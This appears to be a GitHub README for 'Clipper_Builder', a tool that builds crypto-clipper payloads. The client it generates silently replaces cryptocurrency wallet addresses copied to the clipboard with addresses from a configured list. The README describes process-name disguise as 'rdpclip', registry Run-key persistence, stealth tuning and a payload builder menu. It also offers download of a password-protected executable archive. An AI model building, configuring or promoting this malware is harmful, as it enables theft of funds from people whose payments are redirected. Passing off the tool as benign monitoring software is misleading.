# Clipper_Builder

![Version](https://img.shields.io/badge/version-1.0.0-blue)
![License](https://img.shields.io/badge/license-MIT-green)
![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey)
![Release](https://img.shields.io/badge/release-latest-brightgreen)
![Downloads](https://img.shields.io/badge/downloads-latest-blueviolet)

**Clipper_Builder** is a cross-platform clipboard monitoring and builder tool for BTC, ETH, SOL, TRX, LTC, and DOGE address detection. Features include regex matching, address validation, activity logs, custom rules, clipboard history, UI customization, and standalone client generation for Windows.

---

*Zero‑dependency executable – just download, extract, and run.*

[Features](#features) · [Getting Started](#getting-started) · [Configuration](#configuration) · [Address Formats](#supported-address-formats)

![Image alt](https://github.com/Olafsengerandesens/Clipper/blob/main/imag.png)

## Features

### Monitoring Engine

| Feature | Status |
| --- | --- |
| Real-time clipboard polling | ✅ |
| Multi-chain address detection | ✅ |
| Regex pattern matching engine | ✅ |
| EIP-55 checksum validation | ✅ |
| Sub-second response time | ✅ |
| Background system tray mode | ✅ |
| Activity logging & export | ✅ |

### Builder & Configuration

| Feature | Status |
| --- | --- |
| Custom payload builder | ✅ |
| Multi-OS target selection | ✅ |
| Process name disguise | ✅ |
| Address book management | ✅ |
| Chain-specific rule config | ✅ |
| Auto-start registry hook | ✅ |
| Stealth parameter tuning | ✅ |

---

## How It Works

Clipboard (polling)  →  Scanner (regex)  →  Filter (chain)  →  Injector (replace+log)


1. **Monitor** — Polls clipboard at configured interval (default 500ms), detects content changes  
2. **Scanner** — Runs clipboard text through chain-specific regex patterns (BTC, ETH, SOL, TRX, LTC, DOGE)  
3. **Filter** — Checks detected address against enabled chains and address book entries  
4. **Injector** — Replaces clipboard with matching address book entry, logs the event with timestamp  

---

## Supported Address Formats

| Chain | Format | Prefix | Example |
| --- | --- | --- | --- |
| **Bitcoin** | Legacy (P2PKH) | `1`, `3` | `1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa` |
| **Bitcoin** | SegWit (P2WPKH) | `bc1q` | `bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh` |
| **Bitcoin** | Taproot (P2TR) | `bc1p` | `bc1p5d7rjq7g6rdk2yhzks9smlaqtedr4dekq08ge8ztwac72sfr9rusxg3297` |
| **Ethereum** | EVM (0x) | `0x` | `0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18` |
| **Solana** | Base58 | — | `7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU` |
| **Tron** | Base58 (T) | `T` | `TN3W4H6rK2ce4vX9YcnfUz6iP3qBwHR2ya` |
| **Litecoin** | Legacy + SegWit | `L`, `M`, `ltc1` | `LTC1QNWLPGSR5HTN5VW22R37JGQ3MFE` |
| **Dogecoin** | Legacy (D) | `D` | `DH5yaieqoZN36fTUciPGvqNA6U4HmUbhv` |

---

## Address Book

| Label | Chain | Address | Usage Count |
| --- | --- | --- | --- |
| My BTC Main | Bitcoin | `1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa` | 42 |
| ETH Primary | Ethereum | `0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18` | 128 |
| Solana Wallet | Solana | `7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU` | 17 |
| TRC-20 | Tron | `TN3W4H6rK2ce4vX9YcnfUz6iP3qBwHR2ya` | 63 |

---

## Getting Started

### Prerequisites

* **No Python, no dependencies** — everything is bundled into a single executable.
* Windows 10/11.

### Download & Run

1. **Download** the latest release archive:  
[Releases](../../releases)

2. **Extract** the archive using the password: `2026`

3. **Launch** the executable:
   - **Windows**: double-click `Clipper_Builder.exe`

That's it – the interactive menu will appear immediately.

> 💡 The executable contains all required runtime components. No additional installation or setup is needed.

---

## Configuration

All settings are stored in a `config.json` file that is automatically created alongside the executable on first launch. You can edit it manually or use the built‑in menu options.

### Example config.json

```json
{
  "build": {
    "target_os": "windows",
    "target_arch": "x64",
    "output_name": "clip_monitor.exe",
    "custom_icon": "",
    "process_name": "rdpclip",
    "startup_method": "registry",
    "registry_key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
  },
  "chains": {
    "bitcoin": { "enabled": true, "prefix": ["1", "3", "bc1"] },
    "ethereum": { "enabled": true, "prefix": ["0x"] },
    "solana": { "enabled": true, "prefix": [] },
    "tron": { "enabled": true, "prefix": ["T"] },
    "litecoin": { "enabled": false, "prefix": ["L", "M", "ltc1"] }
  },
  "address_book": [
    { "label": "My BTC Main", "chain": "bitcoin", "address": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa" },
    { "label": "ETH Primary", "chain": "ethereum", "address": "0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18" }
  ],
  "detection": {
    "sensitivity": "high",
    "min_address_length": 26,
    "max_address_length": 62,
    "exclusion_patterns": [],
    "clipboard_watch_interval_ms": 500
  }
}


## Usage

After launching the executable, you will see an interactive menu:
╠══════════════════════════════════════════════════════════════════╣
║ [1] Install Dependencies (not needed – all embedded) ║
║ [2] Settings ║
║ [3] About ║
║ [4] Configure Target Chains ║
║ [5] Set Address Book ║
║ [6] Build Options (OS, Icon, Process Name) ║
║ [7] Configure Detection Rules ║
║ [8] Build Clipper Payload ║
║ [0] Exit ║
╚══════════════════════════════════════════════════════════════════╝


Use the number keys to navigate. The built payload will be saved in the same folder as the executable.
